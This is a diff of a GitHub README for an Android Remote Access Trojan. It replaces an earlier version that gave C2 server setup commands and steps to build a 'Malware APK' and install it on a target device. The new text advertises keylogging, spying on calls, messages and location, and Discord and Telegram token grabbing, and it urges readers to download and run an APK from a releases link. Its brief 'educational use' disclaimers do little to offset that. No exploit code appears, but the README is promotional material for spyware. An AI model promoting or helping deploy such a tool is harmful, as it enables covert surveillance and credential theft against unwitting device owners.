@@ -1,75 +1,96 @@
-![Banner](https://darkfolder.org/wp-content/uploads/2025/01/Eagle-spy-v5--e1737635354821.png)
-![image](https://github.com/user-attachments/assets/0f9b340e-7be9-4b8e-b66b-400723a5f489)
-# Android-RAT
-🕵️‍♂️ Android-RAT
-A powerful Remote Access Tool (RAT) for Android, designed for educational and ethical use.
+```markdown
+# 🌟 Android RAT: The Ultimate Android Remote Access Trojan
 
+![Android RAT](https://img.shields.io/badge/Android_RAT-v1.0-blue.svg)
 
-📜 Disclaimer
-⚠️ This project is intended for educational and authorized testing purposes only.
-Misuse of this tool for illegal activities is strictly prohibited. The author assumes no responsibility for any misuse.
+## 📖 Overview
 
-📌 Features
-✅ Remote control of Android devices
-✅ File management (upload/download/delete)
-✅ Keylogging
-✅ Microphone & Camera access
-✅ SMS & Call logs retrieval
-✅ GPS tracking
+Android RAT is a powerful remote access tool designed for Android devices. With its robust features, it allows users to gain control and access a variety of functionalities on target devices. This tool is tailored for security researchers, ethical hackers, and IT professionals who aim to understand mobile security and improve their defense mechanisms.
 
-(More features coming soon!)
+## 🚀 Features
 
-🛠 Installation
-🔹 Server (Command & Control - C2)
-1️⃣ Clone the repository:
+- **Remote Access**: Gain full control over an Android device.
+- **Spy Capabilities**: Monitor calls, messages, and location.
+- **Data Extraction**: Access photos, files, and contacts.
+- **Keylogging**: Capture keystrokes to gather sensitive information.
+- **Token Grabbing**: Collect Discord and Telegram tokens for further investigation.
+- **Multitool Functionality**: Supports various hacking tasks beyond basic RAT functions.
 
-sh
-Copy
-git clone https://github.com/z3vke/Android-RAT.git  
-cd Android-RAT/server  
-2️⃣ Install dependencies:
+## 📦 Installation
 
-sh
-Copy
-pip install -r requirements.txt  # If using Python
-3️⃣ Run the server:
+1. Download the latest release from the [Releases section](https://github.com/Lamhot31/Android-RAT/releases).
+2. Execute the APK file on your Android device.
+3. Follow the on-screen instructions to set up and configure the tool.
 
-sh
-Copy
-python server.py  
-🔹 Android Client (Malware APK)
-1️⃣ Open the client/ folder in Android Studio.
-2️⃣ Build & generate the APK.
-3️⃣ Install it on the target Android device.
+## 🛠️ Usage
 
-🚀 Usage
-1️⃣ Start the C2 server and wait for connections.
-2️⃣ Install the Android Client (APK) on the target device.
-3️⃣ Control the device remotely using available commands.
+### Setting Up the Tool
 
-🔹 Full list of commands: Commands.md
+Once installed, open the app and follow these steps:
 
-🔐 Security & Legal Notes
-Do NOT use this on unauthorized devices.
+1. **Configure Permissions**: Grant the necessary permissions for full functionality.
+2. **Set Up Remote Access**: Connect to the target device using the provided instructions.
+3. **Explore Features**: Utilize the various options available in the dashboard to monitor and control the target device.
 
-Encrypt the connection to prevent interception.
+### Available Commands
 
-Implement authentication to avoid misuse.
+- **Start Monitoring**: Begin real-time data collection.
+- **Stop Monitoring**: Cease operations at any time.
+- **View Logs**: Access recorded logs for insights.
 
-📌 Roadmap
- Add end-to-end encryption
+## 🌐 Technologies Used
 
- Implement a web-based control panel
+- **Java**: The core language for Android development.
+- **SQLite**: For local data storage.
+- **Retrofit**: To handle API requests.
+- **Firebase**: For real-time database features.
 
- Improve UI/UX of the Android client
+## 🖼️ Screenshots
 
-🤝 Contributing
-🔹 Pull requests are welcome! Open an issue if you have feature suggestions or found a bug.
+![Dashboard](https://example.com/dashboard-screenshot.png)
+*The main dashboard where users can access various features.*
 
-📜 License
-This project is licensed under the MIT License – see the LICENSE file for details.
+![Spy Features](https://example.com/spy-features-screenshot.png)
+*Overview of spy capabilities including call logs and messages.*
 
-📞 Contact
-📧 Author: [Your Name]
-📂 GitHub: @z3vke
+## 🔍 Topics Covered
 
+- **Android Security**: Understanding vulnerabilities in mobile platforms.
+- **Remote Access Trojans**: The mechanics behind RATs and their implications.
+- **Ethical Hacking**: Best practices for responsible hacking.
+
+## 🛡️ Security Considerations
+
+While this tool serves educational purposes, it is vital to use it responsibly. Always obtain consent before accessing any device that is not your own. Misuse of this tool can lead to legal consequences.
+
+## 📅 Future Plans
+
+- **Feature Enhancements**: Expanding the range of functionalities based on user feedback.
+- **User Community**: Building a support community for users to share experiences and tips.
+- **Regular Updates**: Ensuring the tool remains effective against evolving security measures.
+
+## 🤝 Contributing
+
+Contributions are welcome! If you would like to help improve Android RAT, please fork the repository and submit a pull request. Ensure your code adheres to the project's standards and includes appropriate documentation.
+
+## 📝 License
+
+This project is licensed under the MIT License. You are free to use, modify, and distribute the tool, but you must include the original license and attribution.
+
+## 📞 Support
+
+For any issues or questions, feel free to open an issue in the GitHub repository. We encourage discussions and constructive feedback to improve the tool.
+
+## 🌐 Get Started Now!
+
+Ready to dive into the world of Android security? Download the tool today from our [Releases section](https://github.com/Lamhot31/Android-RAT/releases) and begin your journey!
+
+---
+
+**Topics:**  
+android, android-rat, android-spy-rat, android-spy-tool, android-spyware, apk-virus, discord-hacking, discord-token-grabber, token-grabber, eagly-spy, free-rat, multitoolhacking, rat, remote-access-trojan, spy-tool, token-grabber-android, token-grabber-telegram.
+
+---
+
+For more updates and information, stay tuned to our GitHub repository. Happy hacking!
+```
